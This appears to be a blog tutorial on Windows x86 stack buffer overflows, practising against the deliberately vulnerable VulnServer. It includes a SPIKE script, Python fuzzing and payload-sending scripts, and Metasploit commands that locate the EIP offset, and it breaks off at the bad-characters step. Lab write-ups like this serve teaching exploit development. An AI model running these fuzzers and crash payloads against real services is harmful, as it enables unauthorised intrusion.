---
title: "Buffer Over Flow Introduction and Solving BrainPan1 as A Challenge"
date: 2026-05-28 00:00:00 +0000
categories: [Low Level]
tags: [Buffer Over Flow, Ctf]
---

Hello Friend, I Hope You Are Well Now . Today I'm Going To Explain the Basics of Buffer Over Flow and To Practice On What You Will Learn I Will Solve [Brainpan 1](https://vulnhub.com/entry/brainpan-1,51/) CTF . Let's Jump Into it !


## What is Buffer Over Flow ?! :

BOF is a Coding Vulnerability, Where Languages That Requires From the Developer To Manage the Memory Manually Like: ( `C, C++` ) Lacks of Checking the Length of a Specific Input ; Which Made the Attacker Able To Over Flow the Memory Locations and Manipulate It To A Maliciuos Address That Executes Bad Stuff in The End ! 

> Buffer Over Flow Exploits and Memory Allocations Differs From Platform To Another and CPU Architecture 

## Windows Memory Stack (x86 CPUs):

Stack of the Memory Used as Temporary Storage To Save Functions and Variable That Will Be Used in Execution . 

**ESP (Extended Stack Pointer)** **<- BUFFER ->**  **EBP (Extended Base Pointer)**, **EIP (Extended Instruction Pointer)**  

. _**EIP is The Most Important Part It Works as the Future Map of Memory Addresses That Instructs What Will happen The Next Step, If We Can OverWrite It To a Memory Address That Will Execute Maliciuos Code So We Can get a Shell**_ 

![StackExplained](../assets/img/POST(1)/stack.png)

### Tools :

Since, That's Windows x86 We Will Need 

- Linux Machine (Kali)
- Windows Machine x86
- Immunity Debugger (Debug What Happens Behind the Scenes)
- VulnerServer (Learning EXE)([https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver))

#### Immunity Debugger :

Open as Admin Because the Program We Will Open Will Be Opened as Admin Too (Opened Port on Windows)

Then Click Attach and Choose the .EXE VulnerableServer

![Step1](../assets/img/POST(1)/step1.png)

![Step2](../assets/img/POST(1)/step2.png)

## Detection :

1. First and Abviuos Way To Detect BOF is If You Have the **Source Code** and You Saw Vulnerable Functions Like strcpy() Without Verfication the User Input .

2. **Spiking**, Testing Random Chars and Bytes Length and See of the App Crashes or Restarts . It's Often Used Before Fuzzing .

    That is VulnServer Which If You Connected To The Machine, It Will Give You Options and You Enter `Option <VALUE>` . So We Can Test Spiking on This With The Command `generic_send_tcp`

    ![ConnectionVulnServer](../assets/img/POST(1)/c1.png)

    ```shell
    $ generic_send_tcp
    argc=1
    Usage: ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR
    ./generic_send_tcp 192.168.1.100 701 something.spk 0 0
    ```

    .spk Script

    ```
    s_readline();
    s_string("STATS ");
    s_string_variable("x");
    ```

    ```shell
    generic_send_tcp 192.168.1.3 9999 spike.spk 0 0
    ```

    For Example, **STATS Function** Doesn't Threw Any Error or Crash All Connection Exit Codes Were 0 (Successful)

    ![noErrors](../assets/img/POST(1)/noerrors.png)

    But, **TRUN Function** Was _Vulnerable_ Because the Error Threw `Access Violation` BOF

    ![Error](../assets/img/POST(1)/error.png)

    and You Will See That 

    ```
    EIP: 41414141 (AAAA)
    ```

    That Mean The Buffer Over Flowed Until It went To the EIP /!\

3. **Fuzzing**, To Find the _**Exact Crash Offset(0x0) EIP**_

    ```python
    #!/usr/bin/env python3

    import socket
    from sys import exit
    from termcolor import colored
    from time import sleep
    from argparse import ArgumentParser

    sa= ArgumentParser(prog= colored("Fuzz For Crash", "yellow"))
    sa.add_argument('-ip', '--ip', type= str, required= True)
    sa.add_argument('-port', '--port', type= int, required= True)
    sa.add_argument('-strbsend', '--strbsend', type= str)
    sa.add_argument('-v', '--verbose', action= "store_true", default= False)
    p= sa.parse_args()
    ip= p.ip.strip()
    port= p.port
    strbsend= p.strbsend
    sent_buffer= ''

    if strbsend :
        sent_buffer= strbsend.strip()
        
    sent_buffer= sent_buffer + ('A' * 80)
    connections= 0

    print(f"Target: {colored(ip, 'yellow')} > {colored(port, 'cyan')}")

    while True :
        try :
            socketUse= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socketUse.settimeout(3)
            socketUse.connect((ip, port))
            socketUse.send(sent_buffer.encode())
            sent_buffer += 'A' * 80
            socketUse.close()
            connections += 1
            sleep(0.1)
            if connections % 10 == 0 :
                print(f"[{colored('*', 'magenta')}] Connections: {colored(connections, 'yellow')} Buffer: {colored(len(sent_buffer), 'blue')} Bytes")
        except Exception as Error :
            print(f"[{colored('+', 'green')}] Crashed On {colored(len(sent_buffer), 'red')} Bytes")
            print(f"Error: {colored(str(Error).strip(), 'green')}")
            exit()
    ```

    That Python Script Connection To The Target Machine Port (Socket) and Sends the Buffer To Command `TRUN` and Stop When Crashes happen

    ```shell
    ./zzz.py -ip 192.168.1.3 -port 9999 -strbsend 'TRUN /.:/' -v
    ```

    ![FuzzScript](../assets/img/POST(1)/fuzzscript.png)

    When It Reached 2489 Bytes Sent, I Saw the Immunity Debugger and The Program Crashed `Access Violation`

    If, We Went Back To Say What is the EIP Value We Will See

    ![CrashEIP](../assets/img/POST(1)/crashEIP.png)
    
    ```
    EIP: 00401D98 (@�)
    ```

    **We Will Use MetaSploit To Create a Pattern Length, Once We Send That Payload We Will Get a Different EIP and Then This Tool Will Automate the Process and Give it The EIP Value**

    ```shell
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2489
    ```

    ```
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3
    ```

    I Made a Anoter Python Script To Send the Payload

    ```python
    #!/usr/bin/env python3

    import socket
    from argparse import ArgumentParser
    from termcolor import colored
    from sys import exit

    sa= ArgumentParser(prog= colored("Send MSF Paylaod !", "yellow"))
    sa.add_argument('-ip', '--ip', type= str, required= True)
    sa.add_argument('-port', '--port', type= int, required= True)
    sa.add_argument('-msf', '--msf', type= str, required= True)
    p= sa.parse_args()
    ip= p.ip.strip()
    port= p.port
    msf= p.msf.strip()

    socketUse= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketUse.settimeout(3)
    socketUse.connect((ip, port))
    socketUse.send(msf.encode())

    print("[+] Payload Sent")
    ```

    ```shell
    ./send_payload.py -ip 192.168.1.3 -p 9999 -msf "TRUN /.:/$(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2489)"
    ```

    ![Sent](../assets/img/POST(1)/sent.png)

    the EIP was **`386F4337`**

    ![OFFSET](../assets/img/POST(1)/gotoffset.png)

    To Get the Exact 0xOFFSET We Will Another MSF Tool Which Will Find the OFFSET not Creating It Specifying the EIP in That Time

    ```shell
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2489 -q 386F4337
    ``` 

    and It Was **`2003`**

    ![EXACTOFFSET](../assets/img/POST(1)/offset.png)

    > **That Means To Reach The EIP From Buffer There 2003 Bytes Long + (386F4337) Hex Chars = 2003 + 4 = 2007** 
    That Will OverWrite the EIP
    {: .prompt-danger }

    To Be Sure That We Got Everything Right I will Replace the EIP With "vvvv" in Hex "76767676"

    ```python
    ('A' * 2003) + ('v' * 4)
    ```
    
    ![YesTrue](../assets/img/POST(1)/yestrue.png) 

## Exploitation :

After You Have Determined the Exact Offset That After It With 4 bytes It Will Overwrite the EIP There are More Steps To Achieve Code Execution :

1. **Finding Bad Characters**

    You Must Remove Chars Like Null Byte \x00 Which Means Stop the String Flow Here.
    and Test All Chars That Will Be Gone Because Each Program Has a Function That When
    It Matches a Symbol or Specific Char It Blows It. That is an Important Step Because Any Mistake Can Prevent the Shell Code Execution (Boring Step By the Way, At least For Me)

    

2. 